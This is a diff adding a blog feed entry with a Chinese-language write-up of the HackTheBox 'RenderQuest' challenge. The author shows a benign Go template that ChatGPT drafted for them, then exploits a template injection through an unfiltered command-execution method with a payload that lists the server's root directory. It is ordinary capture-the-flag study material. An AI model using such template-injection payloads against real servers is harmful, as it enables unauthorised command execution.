@@ -4,6 +4,29 @@
   
     
     <entry>
+      <title>HackTheBox RenderQuest WriteUP</title>
+      <link href="/2023/09/25/HackTheBox-RenderQuest-WriteUP/"/>
+      <url>/2023/09/25/HackTheBox-RenderQuest-WriteUP/</url>
+      
+        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>You’ve found a website that lets you input remote templates for rendering. Your task is to exploit this system’s vulnerabilities to access and retrieve a hidden flag. Good luck!</p></blockquote><p>翻译：您发现了一个可以输入远程模板进行渲染的网站。您的任务是利用该系统的漏洞访问和检索一个隐藏标志。祝你好运！</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image.png" alt="challenge"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>根据描述，网站的功能是让我们提供一个远程的模板，网站对我们的模板进行渲染。远程站点我们可以用GitHubPages，可是我不会写Golang的模板，结题失败，此贴结束。</p><p>咳咳。</p><p>我不会写，让ChatGPT写一个不就完了。先写一个普通的看看长什么样：</p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Client &amp; Server Info&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;Client Information&lt;/h2&gt;    &lt;ul&gt;        &lt;li&gt;Client IP: &#123;&#123;.ClientIP&#125;&#125;&lt;/li&gt;        &lt;li&gt;User Agent: &#123;&#123;.ClientUA&#125;&#125;&lt;/li&gt;        &#123;&#123;with .ClientIpInfo&#125;&#125;            &lt;li&gt;IP Version: &#123;&#123;.IpVersion&#125;&#125;&lt;/li&gt;            &lt;li&gt;IP Address: &#123;&#123;.IpAddress&#125;&#125;&lt;/li&gt;            &lt;li&gt;Latitude: &#123;&#123;.Latitude&#125;&#125;&lt;/li&gt;            &lt;li&gt;Longitude: &#123;&#123;.Longitude&#125;&#125;&lt;/li&gt;            &lt;li&gt;Country Name: &#123;&#123;.CountryName&#125;&#125;&lt;/li&gt;            &lt;li&gt;Country Code: &#123;&#123;.CountryCode&#125;&#125;&lt;/li&gt;            &lt;li&gt;Time Zone: &#123;&#123;.TimeZone&#125;&#125;&lt;/li&gt;            &lt;li&gt;Zip Code: &#123;&#123;.ZipCode&#125;&#125;&lt;/li&gt;            &lt;li&gt;City Name: &#123;&#123;.CityName&#125;&#125;&lt;/li&gt;            &lt;li&gt;Region Name: &#123;&#123;.RegionName&#125;&#125;&lt;/li&gt;            &lt;li&gt;Continent: &#123;&#123;.Continent&#125;&#125;&lt;/li&gt;            &lt;li&gt;Continent Code: &#123;&#123;.ContinentCode&#125;&#125;&lt;/li&gt;        &#123;&#123;end&#125;&#125;    &lt;/ul&gt;    &lt;h2&gt;Server Information&lt;/h2&gt;    &lt;ul&gt;        &lt;li&gt;Hostname: &#123;&#123;.ServerInfo.Hostname&#125;&#125;&lt;/li&gt;        &lt;li&gt;Operating System: &#123;&#123;.ServerInfo.OS&#125;&#125;&lt;/li&gt;        &lt;li&gt;Kernel Version: &#123;&#123;.ServerInfo.KernelVersion&#125;&#125;&lt;/li&gt;        &lt;li&gt;Memory: &#123;&#123;.ServerInfo.Memory&#125;&#125;&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>丢给网站看看效果：</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-1.png" alt="template"></p><p>很好，模板生效了。看到这种题目，第一时间想到的，就是模板注入。检查源码我们可以看到源码中刚好定义了可以执行系统命令的方法：</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-2.png" alt="exec"></p><p>并且这个方法没有对传入的参数做任何过滤。那么，后面的事情就简单了。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>构造Payload查看flag文件的文件名：</p><pre><code class="HTML">    &lt;h2&gt;Get Flag&lt;/h2&gt;    &lt;ul&gt;        &lt;li&gt;Flag: &#123;&#123;.FetchServerInfo "ls /"&#125;&#125;&lt;/li&gt;    &lt;/ul&gt;</code></pre><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-3.png" alt="flag-file"></p><p>读取Flag(这一步Payload就不用多说了吧)：</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-4.png" alt="flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>感谢ChatGPT</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://xz.aliyun.com/t/12642">Go语言下的模板注入</a></li></ul>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> HackTheBox </tag>
+            
+            <tag> Web </tag>
+            
+            <tag> Golang模板注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>HackTheBox Obscure WriteUP</title>
       <link href="/2023/09/12/HackTheBox-Obscure-WriteUP/"/>
       <url>/2023/09/12/HackTheBox-Obscure-WriteUP/</url>
